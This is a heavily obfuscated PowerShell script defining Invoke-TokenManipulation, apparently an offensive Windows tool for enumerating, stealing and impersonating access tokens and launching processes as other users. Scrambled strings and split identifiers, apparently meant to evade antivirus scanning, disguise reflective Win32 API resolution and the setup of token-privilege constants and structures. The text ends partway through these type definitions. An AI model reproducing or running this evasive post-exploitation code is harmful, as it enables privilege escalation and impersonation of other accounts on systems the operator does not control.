$xCrlB  =[TYpe]("{7}{9}{2}{1}{3}{5}{8}{0}{6}{4}"-F 'VE','refLeCtIoN.','m.','CalliNG','S','cO','Ntion','syS','N','te');  sv ("Hr"+"3v") ( [TypE]("{1}{2}{0}{3}" -F'pdoma','A','P','iN') );  Sv ('c6'+'de1') ([TypE]("{6}{9}{7}{11}{10}{3}{4}{1}{2}{5}{8}{0}"-F 'SS','SeMbl','YBU','EmiT.A','S','ILdERac','SysTEm','lECTI','Ce','.ReF','.','On'))  ;  SeT-vARIablE  ('ED'+'qB')  (  [type]("{9}{3}{4}{8}{7}{1}{6}{0}{5}{2}"-F'r','pseRvIcE','TE','m.runTI','m','ibU','S.MARsHalaSATT','tero','e.In','sYSte') ) ;$oVS06=[TypE]("{0}{1}{2}" -f'UiN','T','32') ; set-iteM  ("VARIa"+"Bl"+"e:6gTx") ( [typE]("{1}{2}{0}" -f'onvErtEr','bI','Tc') );   $w1IkU  =  [typE]("{1}{2}{0}"-F 'Ng','S','tRi');    SEt-iTEm ('VARIABLe:'+'a'+'2s') ( [TYpE]("{3}{2}{5}{6}{0}{1}{8}{4}{9}{7}" -F'UNtiME.inT','EROpSErviC','T','SYs','sh','eM','.R','l','Es.MAr','A')) ;   $Ir6vGN= [TYpe]("{3}{1}{7}{2}{5}{6}{4}{0}"-F'Tity','EC','RITy.prInCIPAL.WINDo','s','den','w','SI','U') ;    $syrh3p = [tYPE]("{5}{0}{3}{6}{2}{1}{4}" -f 'Y','SticS.PrO','o','STEm','CESs','s','.diaGN'); Set-VaRIAbLe ("{0}{1}"-f 'IL','0mt') ( [type]("{2}{0}{1}" -F'N','TPtR','I') );function INvOKe-to`keNma`N`ipu`LATiON
{


    [CmdletBinding(DEFaUlTPaRaMETErseTnAME={"{2}{0}{1}" -f 'umer','ate','En'})]
    Param(
        [Parameter(PAraMETERSETname = "e`NuM`eRatE")]
        [Switch]
        ${eN`U`me`RAte},

        [Parameter(pArAMetErsEtNAMe = "r`Ev`Tos`ElF")]
        [Switch]
        ${R`E`V`TOselF},

        [Parameter(ParamETeRsETnaMe = "sHOw`A`LL")]
        [Switch]
        ${SHo`w`ALL},

        [Parameter(PArAMEtERSetNaME = "imP`E`RSOnA`TEuS`er")]
        [Switch]
        ${i`MPE`R`sOnaT`EuSER},

        [Parameter(pAramETeRsETNAme = "Cr`eatEPR`OC`ESS")]
        [String]
        ${c`REatEpro`cesS},

        [Parameter(ParAMetErsetnaME = "w`HoAMi")]
        [Switch]
        ${Who`AMI},

        [Parameter(PArAmEterSETnaMe = "imp`ERso`NATEu`sER")]
        [Parameter(paRamETERSeTNAMe = "CR`ea`TepRocESS")]
        [String]
        ${u`SERn`AmE},

        [Parameter(PArAMeTeRSEtNaME = "I`mPEr`S`ONateUSeR")]
        [Parameter(PaRamETErseTnaME = "C`REA`TEP`ROCesS")]
        [Int]
        ${pROc`E`ss`Id},

        [Parameter(pARAmEterSEtnAMe = "imPerS`onate`US`er", ValuefROMpipeLIne=${Tr`Ue})]
        [Parameter(PArAMETeRSEtname = "c`ReATep`RoceSs", VALueFroMpIPElINE=${T`RUe})]
        [System.Diagnostics.Process]
        ${p`R`ocesS},

        [Parameter(PARameteRSEtnaMe = "i`mp`eRso`N`AteuSer")]
        [Parameter(pARaMetErSEtnAMe = "CReA`T`epR`oCess")]
        ${T`HReaD`ID},

        [Parameter(paRamEtERSEtNaMe = "cr`eAtEpRO`ceSS")]
        [String]
        ${prO`ce`SSa`RGS},

        [Parameter(PaRAmETERsEtnaMe = "C`REAtep`R`ocesS")]
        [Switch]
        ${No`Ui},

        [Parameter(pARAMeteRSeTnAMe = "CReAT`epRoC`eSS")]
        [Switch]
        ${p`Asst`H`Ru}
    )
   
    &("{0}{2}{1}"-f'Set','StrictMode','-') -Version 2

    
    Function Get-DE`Le`Gat`etY`PE
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( PositiON = 0)]
            [Type[]]
            ${p`ARAMETE`RS} = (&("{1}{2}{0}" -f'ct','New-Obj','e') ("{1}{0}" -f'e[]','Typ')(0)),
            
            [Parameter( pOSItIOn = 1 )]
            [Type]
            ${REt`UR`NTYpE} = [Void]
        )

        ${dO`maIN} =  (cHilDITem ("{1}{2}{0}"-f'V','vAr','IablE:HR3')  ).vAluE::"CuR`RE`NTd`omain"
        ${D`y`NaSsembLy} = &("{0}{1}{2}" -f 'Ne','w-','Object') ("{6}{0}{2}{3}{1}{4}{5}" -f't','ssembly','io','n.A','Nam','e','System.Reflec')(("{3}{0}{1}{2}{4}"-f 'Del','ega','t','Reflected','e'))
        ${ASS`e`MbL`y`BuildER} = ${dO`MaiN}."defI`N`e`DynAmI`ca`SSEMb`LY"(${D`YNAs`SEMbly},   ( get-cHiLdiTEm ('va'+'rI'+'aBLe'+':c6DE1') ).VAlUE::"R`UN")
        ${Mod`UlEbui`LDer} = ${As`S`EMBLY`BU`IL`Der}.("{4}{3}{2}{0}{5}{1}"-f'cMo','le','nami','efineDy','D','du').Invoke(("{4}{2}{0}{1}{3}" -f 'mo','ryModul','Me','e','In'), ${fA`L`Se})
        ${tyPeB`U`I`LDER} = ${mo`DUlE`BUIld`ER}.("{3}{0}{1}{2}"-f 'f','ineTy','pe','De').Invoke(("{2}{0}{1}{3}"-f'e','legat','MyD','eType'), ("{1}{6}{3}{0}{4}{5}{7}{2}"-f 'lic, Sealed, AnsiCla','C','s','s, Pub','ss, ','Au','las','toClas'), [System.MulticastDelegate])
        ${cONST`RUCt`OrBUild`eR} = ${TYP`EBU`ild`Er}.("{2}{1}{0}{3}" -f'neCon','efi','D','structor').Invoke(("{2}{0}{3}{5}{4}{1}" -f'deBy',' Public','RTSpecialName, Hi','S','g,','i'),  (gET-vaRIABlE ("{1}{0}" -f 'RLB','xc')  -VaLueo )::"S`TAN`DArd", ${paRAMET`E`Rs})
        ${cO`NsT`RuctorBui`LdeR}.("{4}{3}{5}{2}{1}{0}"-f'ags','ntationFl','e','mpl','SetI','em').Invoke(("{0}{4}{3}{2}{1}" -f'Ru',', Managed','ime','t','n'))
        ${m`eT`hOD`BUiLdeR} = ${t`yP`ebu`ilDER}.("{3}{2}{1}{0}"-f 'd','eMetho','in','Def').Invoke('Invoke', ("{2}{3}{6}{5}{4}{7}{0}{1}"-f'irtu','al','Pu','blic,','ot, ','Sl',' HideBySig, New','V'), ${R`eT`UrNtypE}, ${P`ARAmeT`ERS})
        ${MEtHOD`Bu`iLd`Er}.("{0}{3}{1}{6}{5}{2}{4}" -f 'Se','mpleme','onFlag','tI','s','ati','nt').Invoke(("{3}{1}{2}{0}{4}"-f 'Manage','time,',' ','Run','d'))
        
        &("{0}{2}{1}" -f 'W','Output','rite-') ${TYp`e`B`UiLdER}.("{2}{1}{0}" -f'eType','reat','C').Invoke()
    }


    
    Function G`et-p`ROCAd`dRe`sS
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( posiTiOn = 0, mANdAtOrY = ${tr`Ue} )]
            [String]
            ${M`od`Ule},
            
            [Parameter( PosItIoN = 1, ManDaToRY = ${t`RuE} )]
            [String]
            ${p`RocEDu`Re}
        )

        
        ${sYs`TEM`A`sseMBLy} =  ( dIr ('VaRI'+'ABL'+'e:Hr3v')).vAlue::"cUrREnTdO`Ma`In".("{0}{2}{3}{1}" -f'Ge','lies','t','Assemb').Invoke() |
            &("{0}{2}{3}{1}" -f'Wher','ject','e-','Ob') { ${_}."GLobaLasSembly`C`A`c`He" -And ${_}."l`ocatION".("{0}{1}" -f 'Spli','t').Invoke('\\')[-1].("{0}{2}{1}" -f'E','s','qual').Invoke(("{2}{0}{1}"-f'tem','.dll','Sys')) }
        ${uN`S`AFe`NAt`IveMeT`HoDS} = ${S`YStEMA`Sse`mblY}.("{2}{0}{1}"-f 'y','pe','GetT').Invoke(("{0}{6}{4}{3}{1}{2}{5}" -f 'Micros','in32.Unsaf','eNativeMeth','W','t.','ods','of'))
        
        ${G`Et`MoD`Ul`ehAndLE} = ${U`N`sAfeNaT`I`VEMetHOdS}.("{0}{2}{1}"-f 'G','od','etMeth').Invoke(("{1}{3}{2}{0}" -f 'ndle','G','a','etModuleH'))
        ${GeTPRo`c`A`DdrE`ss} = ${Unsaf`enAtiV`EmEt`H`ODs}.("{1}{2}{0}" -f 'od','Ge','tMeth').Invoke(("{1}{2}{3}{0}{4}" -f'dre','Ge','tPr','ocAd','ss'))
        
        ${k`eRn`32H`AND`lE} = ${geTmoDUL`E`han`d`Le}."inVO`ke"(${nU`LL}, @(${M`Od`ULE}))
        ${tmp`PTr} = &("{0}{1}{2}"-f'New-O','bj','ect') ("{0}{1}"-f 'Int','Ptr')
        ${hA`NDLE`REf} = &("{2}{1}{0}" -f 'ct','Obje','New-') ("{6}{5}{4}{3}{1}{0}{9}{7}{8}{2}"-f'vic','r','f','Se','p','.Runtime.Intero','System','dl','eRe','es.Han')(${T`m`ppTr}, ${ker`N32HAN`D`Le})

        
        &("{1}{0}{3}{2}" -f 'rite-O','W','t','utpu') ${GEtProcaD`d`RE`ss}."iN`Voke"(${NU`lL}, @([System.Runtime.InteropServices.HandleRef]${haN`DLE`REF}, ${p`ROCeD`UrE}))
    }

    
    
    
    ${c`On`Sta`NtS} = @{
        ("{6}{0}{4}{2}{3}{1}{5}" -f 'C','E','SYSTEM','_S','ESS_','CURITY','AC') = 0x01000000
        ("{2}{1}{0}"-f'NTROL','_CO','READ') = 0x00020000
        ("{2}{0}{1}"-f 'ONI','ZE','SYNCHR') = 0x00100000
        ("{1}{4}{2}{3}{0}{5}"-f'TS','S','RD_R','IGH','TANDA','_ALL') = 0x001F0000
        ("{2}{0}{1}"-f 'Q','UERY','TOKEN_') = 8
        ("{4}{3}{0}{2}{1}"-f 'RI','ILEGES','V','P','TOKEN_ADJUST_') = 0x20
        ("{0}{2}{1}"-f'ERRO','KEN','R_NO_TO') = 0x3f0
        ("{1}{3}{5}{4}{2}{0}" -f 'TION','SEC','ELEGA','UR','TY_D','I') = 3
        ("{3}{2}{5}{0}{1}{4}" -f'URITY_INF','ORM','ACL_SE','D','ATION','C') = 0x4
        ("{3}{1}{2}{0}" -f 'E_TYPE','LO','WED_AC','ACCESS_AL') = 0x0
        ("{0}{1}{5}{3}{4}{2}"-f 'STAN','D','IRED','RIGHTS_REQ','U','ARD_') = 0x000F0000
        ("{3}{0}{5}{2}{1}{4}" -f 'SKT','_AL','C','DE','L','OP_GENERI') = 0x000F01FF
        ("{0}{1}"-f 'WRITE_DA','C') = 0x00040000
        ("{0}{2}{3}{4}{1}"-f'OBJECT_IN','CE','HE','RIT_','A') = 0x1
        ("{1}{2}{3}{0}" -f 'S','G','RA','NT_ACCES') = 0x1
        ("{1}{3}{0}{2}" -f 'EE_IS_NA','T','ME','RUST') = 0x1
        ("{1}{2}{0}" -f 'E_IS_SID','TRU','STE') = 0x0
        ("{1}{2}{0}{3}" -f 'EE_','TR','UST','IS_USER') = 0x1
        ("{6}{2}{0}{1}{3}{4}{5}"-f'E','_IS_WE','RUSTE','LL_KNO','WN_GROU','P','T') = 0x5
        ("{0}{2}{4}{1}{3}"-f 'TRU','GR','STEE_I','OUP','S_') = 0x2
        ("{2}{5}{1}{3}{4}{6}{0}" -f 'RY_INFORMATION','S_','PR','Q','U','OCES','E') = 0x400
        ("{2}{0}{5}{4}{1}{3}"-f 'KE','N_','TO','PRIMARY','SIG','N_AS') = 0x1
        ("{1}{0}{3}{2}" -f 'O','T','PLICATE','KEN_DU') = 0x2
        ("{1}{0}{4}{2}{3}" -f 'OKE','T','PERSONAT','E','N_IM') = 0x4
        ("{3}{0}{2}{1}"-f'KEN_Q','CE','UERY_SOUR','TO') = 0x10
        ("{5}{3}{2}{0}{4}{1}"-f 'IG','D','R','ARD_','HTS_REA','STAND') = 0x20000
        ("{0}{4}{2}{1}{3}"-f 'TokenS','is','t','tics','ta') = 10
        ("{0}{1}{3}{2}" -f'TOK','E','L_ACCESS','N_AL') = 0xf01ff
        ("{1}{0}{2}{3}"-f'AXI','M','MUM_ALLOWE','D') = 0x02000000
        ("{1}{2}{4}{3}{0}" -f 'ESS','T','HREAD','C','_ALL_AC') = 0x1f03ff
        ("{4}{2}{3}{0}{1}{5}{6}" -f'ALID_PARAM','ET','_','INV','ERROR','E','R') = 0x57
        ("{0}{5}{7}{2}{6}{4}{3}{1}"-f'L','Y','_NETCREDENTIALS','NL','O','OGO','_','N') = 0x2
        ("{2}{4}{1}{3}{0}" -f'EGE_ENABLED','RIVI','S','L','E_P') = 0x2
        ("{1}{5}{9}{7}{8}{6}{2}{3}{0}{4}" -f'_DEF','SE_P','_','BY','AULT','RIVI','ED','E','NABL','LEGE_') = 0x1
        ("{5}{1}{2}{0}{4}{3}" -f'_','L','EGE','MOVED','RE','SE_PRIVI') = 0x4
    }

    ${wIN`32C`O`NStAnts} = &("{2}{0}{1}" -f'c','t','New-Obje') ("{0}{2}{1}" -f 'PS','ect','Obj') -Property ${cOn`s`TanTs}
    


    
    
    
    
    
    ${D`om`AIn} =   (  gci  ("vaR"+"IABl"+"E:Hr3V")  ).vALue::"cUR`Ren`Td`oMAin"
    ${Dy`N`AmI`cASsEm`Bly} = &("{2}{1}{0}" -f'ct','ew-Obje','N') ("{3}{1}{2}{5}{0}{4}"-f'm.Reflection.Assemb','s','t','Sy','lyName','e')(("{2}{0}{3}{1}" -f 'y','ssembly','D','namicA'))
    ${ass`em`BLYbUilD`er} = ${D`oMA`IN}."D`e`FINed`y`N`AM`ICASSEmbLy"(${DyN`AM`ICasS`eM`BLY},  ( ChilDitem  ("VARi"+"abl"+"E"+":"+"C6DE1")  ).vALUe::"r`UN")
    ${MOD`UlE`BuilDeR} = ${A`sSEm`Bl`YbUILDer}.("{4}{0}{2}{1}{3}" -f 'in','am','eDyn','icModule','Def').Invoke(("{3}{1}{0}{2}"-f 'micMo','yna','dule','D'), ${FaL`SE})
    ${Co`NSTRUCtOr`i`NFo} =  (  gET-VaRIABLE ('ED'+'QB') ).ValuE.("{0}{3}{2}{1}{4}"-f'GetC','structo','n','o','rs').Invoke()[0]

    
    ${tYPe`BuIl`dER} = ${MO`dul`e`BuILder}.("{2}{0}{1}"-f 'neEnu','m','Defi').Invoke(("{2}{0}{5}{1}{3}{4}"-f 'EN_INFO','MATION_','TOK','CLA','SS','R'), ("{1}{0}" -f 'ublic','P'), [UInt32])
    ${TypE`BuI`Ld`er}.("{2}{1}{0}" -f 'Literal','efine','D').Invoke(("{0}{1}{2}" -f'To','k','enUser'), [UInt32] 1) | &("{2}{0}{1}" -f 'N','ull','Out-')
    ${typEb`UIlD`ER}.("{0}{3}{1}{2}"-f 'D','Li','teral','efine').Invoke(("{0}{1}{2}"-f 'Toke','nGrou','ps'), [UInt32] 2) | &("{0}{1}"-f 'Out-N','ull')
    ${t`yPE`BuI`lDER}.("{2}{0}{1}" -f 'r','al','DefineLite').Invoke(("{1}{0}{2}{3}" -f'oke','T','nPri','vileges'), [UInt32] 3) | &("{0}{2}{1}"-f 'Out','Null','-')
    ${T`ypEb`UiLd`Er}.("{0}{3}{1}{2}"-f'D','fi','neLiteral','e').Invoke(("{0}{1}{2}{3}"-f 'To','ke','nOw','ner'), [UInt32] 4) | &("{1}{2}{0}"-f'Null','O','ut-')
    ${typE`Bu`I`LDer}.("{2}{3}{1}{0}" -f 'ral','e','DefineL','it').Invoke(("{3}{0}{1}{2}" -f'okenPrima','ryGro','up','T'), [UInt32] 5) | &("{0}{1}"-f'Out-Nul','l')
    ${ty`p`eb`UILDeR}.("{1}{0}{2}{3}"-f'iter','DefineL','a','l').Invoke(("{1}{0}{3}{2}" -f'enD','Tok','cl','efaultDa'), [UInt32] 6) | &("{2}{0}{1}"-f 'l','l','Out-Nu')
    ${TyPE`B`UiLd`eR}.("{0}{2}{3}{1}" -f'De','teral','fineL','i').Invoke(("{2}{1}{0}"-f'rce','okenSou','T'), [UInt32] 7) | &("{0}{1}"-f 'Out','-Null')
    ${t`YpebuiL`dER}.("{1}{2}{0}" -f'l','Defi','neLitera').Invoke(("{2}{0}{1}"-f'k','enType','To'), [UInt32] 8) | &("{0}{2}{1}" -f 'Out-N','ll','u')
    ${TYP`eB`Ui`Lder}.("{4}{3}{0}{1}{2}" -f'ite','r','al','eL','Defin').Invoke(("{1}{2}{5}{0}{3}{4}{6}" -f'rs','To','k','o','nationL','enImpe','evel'), [UInt32] 9) | &("{0}{1}" -f 'Out-Nu','ll')
    ${TY`PEbuil`der}.("{3}{1}{2}{0}" -f 'l','r','a','DefineLite').Invoke(("{2}{0}{3}{1}{4}"-f 'oken','tatist','T','S','ics'), [UInt32] 10) | &("{0}{2}{1}"-f'Out-','l','Nul')
    ${T`ypebuILD`eR}.("{2}{3}{1}{0}" -f'ral','Lite','Defi','ne').Invoke(("{3}{0}{2}{1}" -f 'kenRe','s','strictedSid','To'), [UInt32] 11) | &("{2}{0}{1}"-f 'u','t-Null','O')
    ${tYPE`BUi`l`DEr}.("{3}{1}{4}{0}{2}" -f'te','n','ral','Defi','eLi').Invoke(("{2}{0}{1}"-f'o','nId','TokenSessi'), [UInt32] 12) | &("{1}{2}{0}"-f'l','Out-N','ul')
    ${t`y`PE`BUILder}.("{1}{2}{0}"-f'teral','DefineL','i').Invoke(("{1}{4}{3}{0}{2}" -f'AndPriv','Tok','ileges','nGroups','e'), [UInt32] 13) | &("{2}{1}{0}"-f'ull','t-N','Ou')
    ${t`YpE`BU`IldEr}.("{1}{2}{0}{3}" -f 'eL','Def','in','iteral').Invoke(("{2}{1}{0}{3}"-f'SessionRefer','n','Toke','ence'), [UInt32] 14) | &("{0}{1}" -f 'Out-N','ull')
    ${TYpe`Bu`ilDer}.("{2}{1}{0}" -f 'teral','efineLi','D').Invoke(("{3}{2}{1}{0}"-f'Inert','x','okenSandBo','T'), [UInt32] 15) | &("{0}{1}{2}"-f 'Out-','N','ull')
    ${tY`peBU`Il`DEr}.("{3}{1}{2}{0}"-f'iteral','e','fineL','D').Invoke(("{1}{2}{3}{0}" -f'y','TokenAud','itP','olic'), [UInt32] 16) | &("{0}{1}"-f 'Ou','t-Null')
    ${tyPe`B`UILdER}.("{2}{3}{1}{0}"-f 'iteral','neL','D','efi').Invoke(("{2}{0}{1}" -f'en','Origin','Tok'), [UInt32] 17) | &("{1}{0}" -f 'l','Out-Nul')
    ${ty`Pe`B`UiLdEr}.("{1}{3}{0}{2}"-f 'eLite','Defi','ral','n').Invoke(("{2}{1}{4}{3}{0}"-f 'ype','ok','T','ionT','enElevat'), [UInt32] 18) | &("{1}{0}"-f'ull','Out-N')
    ${t`YpEBUi`lD`er}.("{4}{3}{0}{1}{2}"-f 'fi','ne','Literal','e','D').Invoke(("{0}{3}{1}{2}" -f 'Tok','inked','Token','enL'), [UInt32] 19) | &("{0}{2}{1}" -f'Ou','Null','t-')
    ${tYpe`B`UiLDer}.("{4}{2}{3}{0}{1}"-f 'ite','ral','f','ineL','De').Invoke(("{1}{2}{0}{3}{4}"-f 'kenEle','T','o','vat','ion'), [UInt32] 20) | &("{0}{2}{1}" -f 'O','ll','ut-Nu')
    ${ty`PeBu`il`dER}.("{1}{0}{2}"-f 'Litera','Define','l').Invoke(("{3}{0}{2}{1}" -f'Restri','ions','ct','TokenHas'), [UInt32] 21) | &("{1}{2}{0}"-f'll','Ou','t-Nu')
    ${tyP`ebuI`LD`Er}.("{0}{2}{3}{1}" -f'De','eral','fine','Lit').Invoke(("{0}{6}{3}{2}{4}{1}{5}" -f 'Tok','rm','ccessI','A','nfo','ation','en'), [UInt32] 22) | &("{1}{0}" -f 'Null','Out-')
    ${ty`pe`Bui`LDeR}.("{2}{0}{3}{1}"-f'ineL','ral','Def','ite').Invoke(("{4}{0}{2}{1}{3}"-f'tual','o','izati','nAllowed','TokenVir'), [UInt32] 23) | &("{2}{1}{0}"-f'ull','ut-N','O')
    ${tYPE`BU`iL`DER}.("{3}{1}{0}{2}" -f'a','efineLiter','l','D').Invoke(("{7}{2}{6}{4}{5}{1}{3}{0}" -f 'ed','onE','tu','nabl','z','ati','ali','TokenVir'), [UInt32] 24) | &("{1}{2}{0}" -f 'ull','Out','-N')
    ${t`ypEbUi`Ld`Er}.("{3}{2}{1}{0}"-f'al','neLiter','efi','D').Invoke(("{1}{3}{2}{0}{4}" -f'yL','Toke','ntegrit','nI','evel'), [UInt32] 25) | &("{2}{1}{0}" -f 'ull','-N','Out')
    ${tyPE`Bu`i`LdeR}.("{4}{2}{3}{1}{0}" -f 'al','neLiter','e','fi','D').Invoke(("{1}{2}{0}"-f'ss','T','okenUIAcce'), [UInt32] 26) | &("{2}{0}{1}" -f '-','Null','Out')
    ${ty`pEb`UILDER}.("{1}{0}{3}{2}"-f'n','Defi','ral','eLite').Invoke(("{0}{2}{1}{3}"-f 'T','Mandatory','oken','Policy'), [UInt32] 27) | &("{1}{0}{2}"-f'u','Out-N','ll')
    ${t`ype`BUILDER}.("{4}{1}{2}{3}{0}" -f'al','e','fi','neLiter','D').Invoke(("{0}{2}{1}" -f 'TokenLog','Sid','on'), [UInt32] 28) | &("{0}{2}{1}" -f'Out-N','l','ul')
    ${T`ypE`BuIlD`ER}.("{2}{0}{1}" -f'iter','al','DefineL').Invoke(("{5}{1}{3}{0}{4}{2}" -f'ta','App','er','Con','in','TokenIs'), [UInt32] 29) | &("{2}{0}{1}" -f'ut-','Null','O')
    ${TypeBu`iLD`ER}.("{0}{1}{3}{2}"-f'Def','ineL','eral','it').Invoke(("{0}{4}{1}{2}{3}"-f 'Token','il','it','ies','Capab'), [UInt32] 30) | &("{0}{1}{2}"-f 'Out-','Nul','l')
    ${TyPE`Build`eR}.("{0}{2}{1}{3}"-f'D','eLit','efin','eral').Invoke(("{3}{4}{0}{1}{2}"-f 'pContai','ner','Sid','TokenA','p'), [UInt32] 31) | &("{2}{0}{1}"-f't-Nu','ll','Ou')
    ${tYP`E`BuiL`der}.("{0}{1}{2}"-f'Defi','neL','iteral').Invoke(("{0}{1}{5}{2}{4}{3}" -f'TokenA','p','ain','Number','er','pCont'), [UInt32] 32) | &("{0}{1}{2}" -f 'O','ut-N','ull')
    ${t`yPE`BuIldER}.("{2}{0}{1}{3}" -f'eLi','tera','Defin','l').Invoke(("{4}{0}{2}{5}{3}{1}" -f'oke','ibutes','nUser','imAttr','T','Cla'), [UInt32] 33) | &("{1}{0}" -f'-Null','Out')
    ${t`YPEB`UIldER}.("{2}{1}{3}{0}"-f 'l','eL','Defin','itera').Invoke(("{3}{5}{0}{1}{6}{2}{7}{4}"-f'eC','laim','tri','TokenDe','s','vic','At','bute'), [UInt32] 34) | &("{2}{1}{0}"-f'ull','ut-N','O')
    ${TY`p`EBuil`DEr}.("{2}{3}{0}{1}" -f 'ter','al','De','fineLi').Invoke(("{0}{6}{3}{7}{1}{5}{2}{4}" -f 'TokenRe','t','r','t','ClaimAttributes','edUse','s','ric'), [UInt32] 35) | &("{2}{0}{1}"-f 'Nul','l','Out-')
    ${ty`PeBU`ILD`eR}.("{0}{2}{3}{1}" -f 'D','teral','efin','eLi').Invoke(("{1}{0}{5}{3}{8}{7}{6}{2}{4}"-f'ken','To','mAttr','cte','ibutes','Restri','i','DeviceCla','d'), [UInt32] 36) | &("{2}{1}{0}" -f'Null','t-','Ou')
    ${typE`BU`iLdeR}.("{0}{2}{1}" -f'DefineL','ral','ite').Invoke(("{1}{5}{2}{4}{3}{0}"-f 'ups','T','e','ro','viceG','okenD'), [UInt32] 37) | &("{0}{1}" -f 'Out-','Null')
    ${ty`p`ebu`iLDeR}.("{0}{1}{3}{2}"-f 'Def','ineLi','eral','t').Invoke(("{6}{0}{1}{2}{3}{5}{4}" -f'estrict','ed','De','vi','oups','ceGr','TokenR'), [UInt32] 38) | &("{1}{0}" -f 'll','Out-Nu')
    ${tyPe`BuI`LD`eR}.("{2}{1}{0}{3}" -f 'i','L','Define','teral').Invoke(("{3}{0}{5}{4}{2}{1}" -f 'ri','ributes','t','TokenSecu','t','tyA'), [UInt32] 39) | &("{0}{2}{1}" -f'O','ull','ut-N')
    ${tY`P`eBUi`LDER}.("{0}{2}{3}{1}" -f 'Def','al','i','neLiter').Invoke(("{0}{1}{2}{3}" -f 'TokenIsR','est','ricte','d'), [UInt32] 40) | &("{0}{2}{1}"-f 'Ou','l','t-Nul')
    ${TYPE`B`UI`lDER}.("{2}{3}{1}{0}"-f 'teral','i','Defi','neL').Invoke(("{1}{3}{2}{0}" -f 'ass','MaxTok','nInfoCl','e'), [UInt32] 41) | &("{0}{2}{1}"-f'O','ull','ut-N')
    ${t`OkE`N`_infO`Rm`AtiO`N_C`lAsS} = ${t`Y`peb`UiLDER}.("{1}{2}{3}{0}" -f 'e','Crea','teTy','p').Invoke()

    
    ${AtT`R`IbUt`eS} = ("{18}{2}{20}{19}{5}{4}{21}{13}{6}{14}{10}{16}{3}{11}{1}{15}{8}{12}{9}{0}{7}{17}"-f 'd','d,','utoLayout, AnsiCla',' Sea','s, Publ','s','ay','I','reFi','l','t','le','e','uentialL','ou',' Befo',',','nit','A','Cla','ss, ','ic, Seq')
    ${T`ype`Bui`LdEr} = ${Mod`U`LeBUIlD`ER}.("{1}{2}{0}"-f 'neType','De','fi').Invoke(("{0}{1}{2}{3}" -f 'LA','R','GE_INTE','GER'), ${attr`ib`UTES}, [System.ValueType], 8)
    ${ty`PE`BU`ilDER}.("{1}{2}{0}"-f'd','Defin','eFiel').Invoke(("{1}{0}" -f't','LowPar'), [UInt32], ("{1}{2}{0}"-f 'ic','Pub','l')) | &("{1}{2}{0}"-f'ull','Out-','N')
    ${t`ypE`B`UiLDer}.("{1}{0}{2}"-f 'Fiel','Define','d').Invoke(("{0}{1}" -f'Hi','ghPart'), [UInt32], ("{1}{0}" -f'ublic','P')) | &("{0}{2}{1}"-f 'O','t-Null','u')
    ${la`RG`e_`int`Eger} = ${t`Ypebu`ilDeR}.("{2}{1}{0}{3}" -f'e','reat','C','Type').Invoke()

    
    ${ATTrIb`U`Tes} = ("{2}{5}{9}{0}{14}{12}{11}{3}{10}{7}{6}{4}{8}{13}{1}"-f'AnsiClas','t','AutoLayo','ss, Public, Sequen','ef','ut,',', Sealed, B','alLayout','ore',' ','ti','a','l','FieldIni','s, C')
    ${T`Y`PEb`UildEr} = ${MO`dU`leBUiL`DER}.("{2}{1}{0}" -f'ype','fineT','De').Invoke(("{0}{1}" -f'L','UID'), ${aTtrIbU`T`es}, [System.ValueType], 8)
    ${Typ`e`Bu`IldER}.("{2}{3}{0}{1}"-f'Fi','eld','Defin','e').Invoke(("{1}{0}"-f'art','LowP'), [UInt32], ("{1}{0}" -f 'c','Publi')) | &("{0}{1}{2}" -f 'Out-','N','ull')
    ${Ty`pEb`UIlDER}.("{0}{1}{2}{3}" -f 'D','efi','neFi','eld').Invoke(("{0}{1}"-f'Hig','hPart'), [Int32], ("{0}{1}"-f'Pu','blic')) | &("{1}{2}{0}" -f't-Null','O','u')
    ${L`UId} = ${tYpE`BuI`LDER}.("{2}{3}{1}{0}"-f'ype','eT','Cre','at').Invoke()

    
    ${atT`RiB`UTeS} = ("{12}{8}{15}{11}{16}{2}{0}{6}{4}{3}{17}{1}{5}{9}{13}{10}{14}{7}" -f'lass','out','C','Pub','ss, ',', Sealed',', Cla','eFieldInit','yout',',','efo','A','AutoLa',' B','r',', ','nsi','lic, SequentialLay')
    ${tyP`Eb`UI`LDeR} = ${MO`DulEBU`i`lDeR}.("{2}{0}{1}"-f'fine','Type','De').Invoke(("{3}{4}{2}{0}{1}" -f 'TIST','ICS','EN_STA','T','OK'), ${A`T`TR`IBuTEs}, [System.ValueType])
    ${T`Y`PEBUIldeR}.("{2}{3}{0}{1}" -f'fine','Field','D','e').Invoke(("{0}{1}"-f 'T','okenId'), ${l`UId}, ("{1}{0}" -f 'blic','Pu')) | &("{1}{2}{0}"-f'll','Out-','Nu')
    ${TypEBu`iL`D`Er}.("{3}{1}{0}{2}" -f 'ne','efi','Field','D').Invoke(("{1}{0}{3}{2}" -f't','Au','ticationId','hen'), ${l`UID}, ("{1}{0}" -f'blic','Pu')) | &("{0}{1}" -f 'Out-','Null')
    ${tY`p`ebU`ILdER}.("{1}{2}{0}" -f 'd','D','efineFiel').Invoke(("{4}{0}{2}{1}{3}"-f'r','onT','ati','ime','Expi'), ${L`ArGe_`i`N`TeGEr}, ("{2}{1}{0}"-f 'lic','ub','P')) | &("{0}{1}{2}"-f'Ou','t','-Null')
    ${TYp`e`BuI`LdeR}.("{2}{1}{0}{3}"-f 'el','fineFi','De','d').Invoke(("{0}{1}"-f 'TokenTy','pe'), [UInt32], ("{0}{1}{2}"-f 'Pu','bli','c')) | &("{1}{0}" -f 't-Null','Ou')
    ${t`YpeBUi`L`dEr}.("{1}{0}{2}" -f'neFi','Defi','eld').Invoke(("{4}{1}{2}{0}{5}{3}"-f'ev','na','tionL','l','Imperso','e'), [UInt32], ("{0}{1}"-f 'Pu','blic')) | &("{1}{2}{0}"-f 'll','Out-','Nu')
    ${T`YpEbU`I`LDER}.("{1}{0}{2}" -f'eFie','Defin','ld').Invoke(("{2}{1}{0}"-f 'amicCharged','n','Dy'), [UInt32], ("{1}{0}{2}"-f 'l','Pub','ic')) | &("{2}{1}{0}"-f'l','ut-Nul','O')
    ${Ty`p`ebu`iLDER}.("{1}{3}{2}{0}" -f 'Field','Def','ne','i').Invoke(("{0}{2}{3}{1}" -f 'Dynamic','able','A','vail'), [UInt32], ("{2}{1}{0}" -f 'ic','l','Pub')) | &("{1}{0}{2}"-f 'Nul','Out-','l')
